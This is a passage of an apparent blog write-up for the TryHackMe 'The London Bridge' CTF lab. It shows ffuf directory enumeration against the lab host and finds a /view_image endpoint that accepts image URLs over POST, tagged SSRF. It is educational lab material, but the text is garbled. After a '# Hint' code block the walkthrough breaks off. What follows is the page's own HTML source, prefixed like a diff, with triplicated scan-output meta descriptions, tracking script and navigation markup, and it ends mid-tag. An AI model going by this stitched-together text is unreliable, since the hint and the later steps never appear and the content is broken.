auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Contact page</strong></figcaption></figure>In contact page, we can leave our feedback.</p><p><figure><img src=/posts/thelondonbridge/4.png title="Feedback page" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Feedback page</strong></figcaption></figure>Here is the feedback page after giving feedback in contact page.</p><h3 id=ffuf>ffuf</h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ffuf -c -u http://londonbridge.thm:8080/FUZZ -w /usr/share/wordlists/dirb/big.txt
-</span></span><span class=line><span class=cl>________________________________________________
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>contact                 <span class=o>[</span>Status: 200, Size: 1703, Words: 549, Lines: 60, Duration: 161ms<span class=o>]</span>
-</span></span><span class=line><span class=cl>feedback                <span class=o>[</span>Status: 405, Size: 178, Words: 20, Lines: 5, Duration: 155ms<span class=o>]</span>
-</span></span><span class=line><span class=cl>gallery                 <span class=o>[</span>Status: 200, Size: 1722, Words: 484, Lines: 55, Duration: 376ms<span class=o>]</span>
-</span></span><span class=line><span class=cl>upload                  <span class=o>[</span>Status: 405, Size: 178, Words: 20, Lines: 5, Duration: 152ms<span class=o>]</span>
-</span></span><span class=line><span class=cl>view_image              <span class=o>[</span>Status: 405, Size: 178, Words: 20, Lines: 5, Duration: 152ms<span class=o>]</span>
-</span></span></code></pre></div><p>Got some interesting result from ffuf. From the above results we have visited app pages expect one <code>view_image</code>.</p><p><figure><img src=/posts/thelondonbridge/5.png title="BurpSuite: /view_image" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>BurpSuite: /view_image</strong></figcaption></figure>While checking for <code>/view_image</code> we are getting <code>Method Not Allowed</code> error. Now lets change the method type to <code>POST</code>.</p><p><figure><img src=/posts/thelondonbridge/6.png title="View Image page" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>View Image page</strong></figcaption></figure>By changing the request <code>from GET to POST</code>, we are able to access <code>/view_image</code> page where we can give <code>image url as input</code>.</p><figure><img src=/posts/thelondonbridge/7.png title="Using Image url" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>Using Image url</strong></figcaption></figure><p><figure><img src=/posts/thelondonbridge/8.png title="BurpSuite using image url" style="display:block;margin:0 auto"><figcaption class="text-sm text-center text-slate-500 dark:text-slate-300"><strong>BurpSuite using image url</strong></figcaption></figure>If we gave image url, this page is loading and showing the image on the same page. Lets try to use this for reverse shell.</p><p>Tried uploading multiple payloads using url, but no exploits worked. It&rsquo;s because directly image url is added in image tag, without backend processing. Lets look into hint provided.</p><pre><code># Hint
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <title>The London Bridge | THM Writeup :: CyberJagadeesh - Learn Cyber Security</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta
+  name="description"
+  content="Introduction Detailed walkthroughs for The London Bridge CTF challenges on TryHackMe .
+Shell as beth echo &#34;10.10.72.132 londonbridge.thm&#34; &gt;&gt; /etc/hosts Mappped the ip to domain londonbridge.thm.
+Rustscan $ rustscan -a londonbridge.thm -- -sC -sV PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDziNs6aSHIQOJFilv8PhCPd676iD1TrhMYe4p4Mj2E3yaAl4xb8DNT2dhpcv6H8EvtCJnAbXmnFTTOZy14fd7FKc2/Mr4MNLsINFpMU8hc85g6S9ZEnWKlU8dw5jUUeZnAbHSTnq6ARvEbT/Y5seiWEJ7IBiUqptlUA2eiOU7g0DFwrYH7n40aDe0m6PKPIfI9G0XO0cJHISeJ0bsSES1uun2WHLM0sRx&#43;17hrBgM2YfD9OevcltVMlQqWasP9lqf2ooOdBvQTq4eH5UyyuEzaRtQwBYP/wWQEVFacejJE1iT2VD6ZAilhlzo9mww9vqTEwGTvatH65wiyCZHMvrSb | 256 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJuZrGZxDIlI4pU1KNZ8A87cWFcgHxRSt7yFgBtJoUQMhNmcw8FSVC54b7sBYXCgBsgISZfWYPjBM9kikh8Jnkw= | 256 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICkCeqFADY/YvhJyJabcs5DVTYbl/DEKEpBoluTuDdB1 8080/tcp open http-proxy syn-ack ttl 60 gunicorn |_http-server-header: gunicorn | fingerprint-strings: | GetRequest: | HTTP/1.0 200 OK | Server: gunicorn | Date: Mon, 30 Sep 2024 16:13:38 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 2682 | &lt;!DOCTYPE html&gt; | &lt;html lang=&#34;en&#34;&gt; | &lt;head&gt; | &lt;meta charset=&#34;UTF-8&#34;&gt; | &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt; | &lt;title&gt;Explore London&lt;/title&gt; | &lt;style&gt; | body { | font-family: Arial, sans-serif; | margin: 0; | padding: 0; | background-color: #f2f2f2; | header { | background-color: #333; | color: #fff; | padding: 10px 20px; | text-align: center; | background-color: #444; | color: #fff; | padding: 10px 20px; | text-align: center; | color: #fff; | text-decoration: none; | margin: 0 10p | HTTPOptions: | HTTP/1.0 200 OK | Server: gunicorn | Date: Mon, 30 Sep 2024 16:13:39 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Allow: HEAD, OPTIONS, GET |_ Content-Length: 0 | http-methods: |_ Supported Methods: HEAD OPTIONS GET |_http-title: Explore London Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel From the above result we know,
+"
+/>
+<meta
+  name="keywords"
+  content="cyber security, penetration testing, ethical hacking, vulnerability assessment, network security, application security, web application security, security testing, red teaming, bug bounty, CTFs, cybersecurity challenges, hacking tutorials, security tools, exploit development, reverse engineering, penetration tester, security researcher, security analyst, information security, digital forensics, incident response, threat intelligence, security awareness, social engineering, phishing, malware analysis, cryptography, cloud security, IoT security, mobile security, how to become a penetration tester, penetration testing tools, CTF challenges for beginners, web application penetration testing, network penetration testing, exploit development tutorial, reverse engineering techniques, bug bounty hunting tips, security research projects, cyber security certifications"
+/>
+<meta name="robots" content="noodp" /><link rel="manifest" href="/manifest.json" /><meta property="og:url" content="https://cyberjagadeesh.github.io/posts/thelondonbridge/writeup/">
+  <meta property="og:site_name" content="CyberJagadeesh">
+  <meta property="og:title" content="The London Bridge | THM Writeup">
+  <meta property="og:description" content="Introduction Detailed walkthroughs for The London Bridge CTF challenges on TryHackMe .
+Shell as beth echo &#34;10.10.72.132 londonbridge.thm&#34; &gt;&gt; /etc/hosts Mappped the ip to domain londonbridge.thm.
+Rustscan $ rustscan -a londonbridge.thm -- -sC -sV PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDziNs6aSHIQOJFilv8PhCPd676iD1TrhMYe4p4Mj2E3yaAl4xb8DNT2dhpcv6H8EvtCJnAbXmnFTTOZy14fd7FKc2/Mr4MNLsINFpMU8hc85g6S9ZEnWKlU8dw5jUUeZnAbHSTnq6ARvEbT/Y5seiWEJ7IBiUqptlUA2eiOU7g0DFwrYH7n40aDe0m6PKPIfI9G0XO0cJHISeJ0bsSES1uun2WHLM0sRx&#43;17hrBgM2YfD9OevcltVMlQqWasP9lqf2ooOdBvQTq4eH5UyyuEzaRtQwBYP/wWQEVFacejJE1iT2VD6ZAilhlzo9mww9vqTEwGTvatH65wiyCZHMvrSb | 256 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJuZrGZxDIlI4pU1KNZ8A87cWFcgHxRSt7yFgBtJoUQMhNmcw8FSVC54b7sBYXCgBsgISZfWYPjBM9kikh8Jnkw= | 256 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICkCeqFADY/YvhJyJabcs5DVTYbl/DEKEpBoluTuDdB1 8080/tcp open http-proxy syn-ack ttl 60 gunicorn |_http-server-header: gunicorn | fingerprint-strings: | GetRequest: | HTTP/1.0 200 OK | Server: gunicorn | Date: Mon, 30 Sep 2024 16:13:38 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 2682 | &lt;!DOCTYPE html&gt; | &lt;html lang=&#34;en&#34;&gt; | &lt;head&gt; | &lt;meta charset=&#34;UTF-8&#34;&gt; | &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt; | &lt;title&gt;Explore London&lt;/title&gt; | &lt;style&gt; | body { | font-family: Arial, sans-serif; | margin: 0; | padding: 0; | background-color: #f2f2f2; | header { | background-color: #333; | color: #fff; | padding: 10px 20px; | text-align: center; | background-color: #444; | color: #fff; | padding: 10px 20px; | text-align: center; | color: #fff; | text-decoration: none; | margin: 0 10p | HTTPOptions: | HTTP/1.0 200 OK | Server: gunicorn | Date: Mon, 30 Sep 2024 16:13:39 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Allow: HEAD, OPTIONS, GET |_ Content-Length: 0 | http-methods: |_ Supported Methods: HEAD OPTIONS GET |_http-title: Explore London Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel From the above result we know,">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-10-02T23:46:18+05:30">
+    <meta property="article:modified_time" content="2024-10-02T23:46:18+05:30">
+    <meta property="article:tag" content="SSRF">
+    <meta property="article:tag" content="CVE-2018-18955">
+    <meta property="article:tag" content="Ffuf">
+      <meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/thm/backtrack/writeup/">
+      <meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/block/writeup/">
+      <meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/pyrat/writeup/">
+      <meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/cheesectf/writeup/">
+      <meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/breakme/writeup/">
+      <meta property="og:see_also" content="https://cyberjagadeesh.github.io/posts/certaindoom/writeup/">
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="The London Bridge | THM Writeup">
+  <meta name="twitter:description" content="Introduction Detailed walkthroughs for The London Bridge CTF challenges on TryHackMe .
+Shell as beth echo &#34;10.10.72.132 londonbridge.thm&#34; &gt;&gt; /etc/hosts Mappped the ip to domain londonbridge.thm.
+Rustscan $ rustscan -a londonbridge.thm -- -sC -sV PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDziNs6aSHIQOJFilv8PhCPd676iD1TrhMYe4p4Mj2E3yaAl4xb8DNT2dhpcv6H8EvtCJnAbXmnFTTOZy14fd7FKc2/Mr4MNLsINFpMU8hc85g6S9ZEnWKlU8dw5jUUeZnAbHSTnq6ARvEbT/Y5seiWEJ7IBiUqptlUA2eiOU7g0DFwrYH7n40aDe0m6PKPIfI9G0XO0cJHISeJ0bsSES1uun2WHLM0sRx&#43;17hrBgM2YfD9OevcltVMlQqWasP9lqf2ooOdBvQTq4eH5UyyuEzaRtQwBYP/wWQEVFacejJE1iT2VD6ZAilhlzo9mww9vqTEwGTvatH65wiyCZHMvrSb | 256 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJuZrGZxDIlI4pU1KNZ8A87cWFcgHxRSt7yFgBtJoUQMhNmcw8FSVC54b7sBYXCgBsgISZfWYPjBM9kikh8Jnkw= | 256 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICkCeqFADY/YvhJyJabcs5DVTYbl/DEKEpBoluTuDdB1 8080/tcp open http-proxy syn-ack ttl 60 gunicorn |_http-server-header: gunicorn | fingerprint-strings: | GetRequest: | HTTP/1.0 200 OK | Server: gunicorn | Date: Mon, 30 Sep 2024 16:13:38 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 2682 | &lt;!DOCTYPE html&gt; | &lt;html lang=&#34;en&#34;&gt; | &lt;head&gt; | &lt;meta charset=&#34;UTF-8&#34;&gt; | &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt; | &lt;title&gt;Explore London&lt;/title&gt; | &lt;style&gt; | body { | font-family: Arial, sans-serif; | margin: 0; | padding: 0; | background-color: #f2f2f2; | header { | background-color: #333; | color: #fff; | padding: 10px 20px; | text-align: center; | background-color: #444; | color: #fff; | padding: 10px 20px; | text-align: center; | color: #fff; | text-decoration: none; | margin: 0 10p | HTTPOptions: | HTTP/1.0 200 OK | Server: gunicorn | Date: Mon, 30 Sep 2024 16:13:39 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Allow: HEAD, OPTIONS, GET |_ Content-Length: 0 | http-methods: |_ Supported Methods: HEAD OPTIONS GET |_http-title: Explore London Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel From the above result we know,">
+
+
+<link rel="canonical" href="https://cyberjagadeesh.github.io/posts/thelondonbridge/writeup/" />
+
+<link rel="shortcut icon" href="/favicon.ico" />
+<link rel="stylesheet" href="/css/index.min.1f9b3e6594d41770030cc9cea67e9220cd9066bb33910ebfb19ea46cf6b4b50c.css">
+
+
+
+
+
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-376DY6PW0W"></script>
+      <script>
+        var doNotTrack = false;
+        if ( false ) {
+          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
+          var doNotTrack = (dnt == "1" || dnt == "yes");
+        }
+        if (!doNotTrack) {
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments);}
+          gtag('js', new Date());
+          gtag('config', 'G-376DY6PW0W');
+        }
+      </script>
+
+
+
+
+  
+  <script type="application/ld+json">
+  {"@context":"https://schema.org","@type":"Article","author":{"@type":"Person","name":"CyberJagadeesh"},"dateModified":"2024-10-02T23:46:18+05:30","datePublished":"2024-10-02T23:46:18+05:30","description":"Introduction Detailed walkthroughs for The London Bridge CTF challenges on TryHackMe .\nShell as beth echo \u0026#34;10.10.72.132 londonbridge.thm\u0026#34; \u0026gt;\u0026gt; /etc/hosts Mappped the ip to domain londonbridge.thm.\nRustscan $ rustscan -a londonbridge.thm -- -sC -sV PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDziNs6aSHIQOJFilv8PhCPd676iD1TrhMYe4p4Mj2E3yaAl4xb8DNT2dhpcv6H8EvtCJnAbXmnFTTOZy14fd7FKc2/Mr4MNLsINFpMU8hc85g6S9ZEnWKlU8dw5jUUeZnAbHSTnq6ARvEbT/Y5seiWEJ7IBiUqptlUA2eiOU7g0DFwrYH7n40aDe0m6PKPIfI9G0XO0cJHISeJ0bsSES1uun2WHLM0sRx+17hrBgM2YfD9OevcltVMlQqWasP9lqf2ooOdBvQTq4eH5UyyuEzaRtQwBYP/wWQEVFacejJE1iT2VD6ZAilhlzo9mww9vqTEwGTvatH65wiyCZHMvrSb | 256 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJuZrGZxDIlI4pU1KNZ8A87cWFcgHxRSt7yFgBtJoUQMhNmcw8FSVC54b7sBYXCgBsgISZfWYPjBM9kikh8Jnkw= | 256 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICkCeqFADY/YvhJyJabcs5DVTYbl/DEKEpBoluTuDdB1 8080/tcp open http-proxy syn-ack ttl 60 gunicorn |_http-server-header: gunicorn | fingerprint-strings: | GetRequest: | HTTP/1.0 200 OK | Server: gunicorn | Date: Mon, 30 Sep 2024 16:13:38 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 2682 | \u0026lt;!DOCTYPE html\u0026gt; | \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; | \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; | \u0026lt;title\u0026gt;Explore London\u0026lt;/title\u0026gt; | \u0026lt;style\u0026gt; | body { | font-family: Arial, sans-serif; | margin: 0; | padding: 0; | background-color: #f2f2f2; | header { | background-color: #333; | color: #fff; | padding: 10px 20px; | text-align: center; | background-color: #444; | color: #fff; | padding: 10px 20px; | text-align: center; | color: #fff; | text-decoration: none; | margin: 0 10p | HTTPOptions: | HTTP/1.0 200 OK | Server: gunicorn | Date: Mon, 30 Sep 2024 16:13:39 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Allow: HEAD, OPTIONS, GET |_ Content-Length: 0 | http-methods: |_ Supported Methods: HEAD OPTIONS GET |_http-title: Explore London Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel From the above result we know,\n","image":"/posts/thelondonbridge/thelondonbridge.png","name":"The London Bridge | THM Writeup","url":"https://cyberjagadeesh.github.io/posts/thelondonbridge/writeup/"}
+</script>
+
+</head>
+<body class="flex flex-col min-h-screen w-full bg-slate-50 dark:bg-gray-800"><header class="flex flex-none justify-center z-10">
+    <div class="flex flex-row gap justify-between w-full max-w-4xl lg:max-w-5xl h-12 mt-3">
+  <div class="flex-none ml-2 md:ml-0">
+    <a href="/" class="">
+      <img class="h-12 w-12 rounded-full object-cover bg-gray-100" src="/logo.png" alt="logo">
+    </a>
+  </div>
+  <div class="flex-1"></div>
+  <div class="flex-none">
+    
+
+
+
+<nav class="h-full static">
+  <button id="navbar-menu-toggle" type="button" class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg md:hidden" aria-controls="navbar-menu" aria-expanded="false">
+    <span class="sr-only">Open main menu</span>
+    <i class="w-8 h-8">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-menu-2" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 6l16 0" />
+  <path d="M4 12l16 0" />
+  <path d="M4 18l16 0" />
+</svg>
+
+    </i>
+  </button>
+  <div class="absolute md:static top-16 left-0 right-0 z-50 hidden w-full md:block md:w-auto" id="navbar-menu">
+    <ul class="flex flex-col mx-2 md:mx-0 md:flex-row md:border-0 rounded-sm md:rounded-full px-3 text-base font-medium text-slate-800 dark:text-slate-200 shadow-lg bg-white dark:bg-gray-600 shadow-slate-800/5 dark:shadow-slate-200/5 ring-1 ring-slate-900/5 dark:ring-slate-100/5">
+    
+        <li id="about" class="">
+          <a class="block px-3 py-3 hover:text-emerald-600"
+            href="/about/" title="About">About</a>
+        </li>
+      
+    
+        <li id="post" class="">
+          <a class="block px-3 py-3 hover:text-emerald-600 text-emerald-600"
+            href="/posts/" title="Post">Post</a>
+        </li>
+      
+    
+    </ul>
+  </div>
+</nav>
+
+
+  </div>
+  
+  <div class="flex-none mx-1"></div>
+  
+  <div class="flex-none md:hidden">
+    <a href=/search/ class="inline-flex items-center p-2 text-sm text-slate-800 dark:text-slate-200 rounded-lg" aria-controls="navbar-menu" aria-expanded="false">
+      <span class="sr-only">Search</span>
+      <i class="w-8 h-8">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+    <path d="M10 10m-7 0a7 7 0 1 0 14 0a7 7 0 1 0 -14 0" />
+    <path d="M21 21l-6 -6" />
+</svg>
+
+      </i>
+    </a>
+  </div>
+  <div class="darkmode-toggle flex flex-none mr-2 md:mr-0">
+    <label for="darkmode-toggle" class="flex items-center px-3 cursor-pointer rounded-full bg-gray-100 dark:bg-gray-600" title="Toggle dark mode">
+      <input name="darkmode-toggle" id="darkmode-toggle" type="checkbox" class="sr-only peer" aria-label="Toggle dark mode">
+      <div class="group flex flex-row gap-1 justify-center h-8 px-1 rounded-full bg-white dark:bg-gray-700">
+        <i class="h-6 w-6 flex-none rounded-full bg-yellow-400 place-self-center peer-checked:group-[]:invisible">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brightness-down" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M12 12m-3 0a3 3 0 1 0 6 0a3 3 0 1 0 -6 0"></path>
+   <path d="M12 5l0 .01"></path>
+   <path d="M17 7l0 .01"></path>
+   <path d="M19 12l0 .01"></path>
+   <path d="M17 17l0 .01"></path>
+   <path d="M12 19l0 .01"></path>
+   <path d="M7 17l0 .01"></path>
+   <path d="M5 12l0 .01"></path>
+   <path d="M7 7l0 .01"></path>
+</svg>
+
+        </i>
+        <i class="h-6 w-6 flex-none rounded-full place-self-center invisible peer-checked:group-[]:visible">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-moon-stars" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path>
+   <path d="M17 4a2 2 0 0 0 2 2a2 2 0 0 0 -2 2a2 2 0 0 0 -2 -2a2 2 0 0 0 2 -2"></path>
+   <path d="M19 11h2m-1 -1v2"></path>
+</svg>
+
+        </i>
+      </div>
+    </label>
+  </div>
+</div>
+
+  </header>
+  <main class="flex flex-auto justify-center">
+    
+<div class="w-full max-w-4xl lg:max-w-5xl">
+  <div class="flex flex-col mt-6 mx-2 md:mx-0 rounded-lg overflow-hidden shadow-md bg-white dark:bg-gray-700">
+    <div>
+      <a href="/posts/thelondonbridge/writeup/">
+        <figure>
+    <img class="w-full object-cover h-36 md:h-48 xl:h-60" src="/posts/thelondonbridge/thelondonbridge.png"
+      alt="The London Bridge | THM Writeup" title="The London Bridge | THM Writeup"
+      loading="lazy"
+    >
+  </figure>
+      </a>
+    </div>
+    <div class="flex flex-col gap-y-3 p-6">
+      <h1 class="text-4xl font-semibold text-slate-800 dark:text-slate-100">
+        <a href="/posts/thelondonbridge/writeup/">The London Bridge | THM Writeup</a>
+      </h1>
+
+      
+      
+  <ul class="flex flex-row flex-wrap text-slate-500 dark:text-slate-300">
+    
+      
+      <li>
+        <a href="/categories/ctf/"
+          class="text-sm mr-2 px-2 py-1 rounded border border-emerald-800 bg-emerald-800 text-slate-50">
+          CTF
+        </a>
+      </li>
+      
+      <li>
+        <a href="/categories/forensic/"
+          class="text-sm mr-2 px-2 py-1 rounded border border-emerald-800 bg-emerald-800 text-slate-50">
+          Forensic
+        </a>
+      </li>
+      
+    
+    
+      
+      <li>
+        <a href="/tags/ssrf/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">SSRF</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/cve-2018-18955/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">CVE-2018-18955</span>
+        </a>
+      </li>
+      
+      <li>
+        <a href="/tags/ffuf/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Ffuf</span>
+        </a>
+      </li>
+      
+    
+    
+      
+      <li>
+        <a href="/series/tryhackme/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Tryhackme</span>
+        </a>
+      </li>
+      
+    
+    
+      
+      <li>
+        <a href="/platforms/linux/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Linux</span>
+        </a>
+      </li>
+      
+    
+    
+      
+      <li>
+        <a href="/levels/medium/"
+          class="flex flex-row text-sm mr-2 py-1">
+          <i class="h-5 w-5 flex-none">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M5 9l14 0"></path>
+   <path d="M5 15l14 0"></path>
+   <path d="M11 4l-4 16"></path>
+   <path d="M17 4l-4 16"></path>
+</svg>
+
+          </i>
+          <span class="ml-0">Medium</span>
+        </a>
+      </li>
+      
+    
+    
+  </ul>
+
+
+
+      <div class="flex flex-col gap-y-1 md:flex-row md:gap-y-0 md:gap-x-4 text-slate-500 dark:text-slate-300">
+  
+  
+  <div class="flex flex-row text-base gap-x-1">
+    <i class="h-6 w-6 flex-none">
+      <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
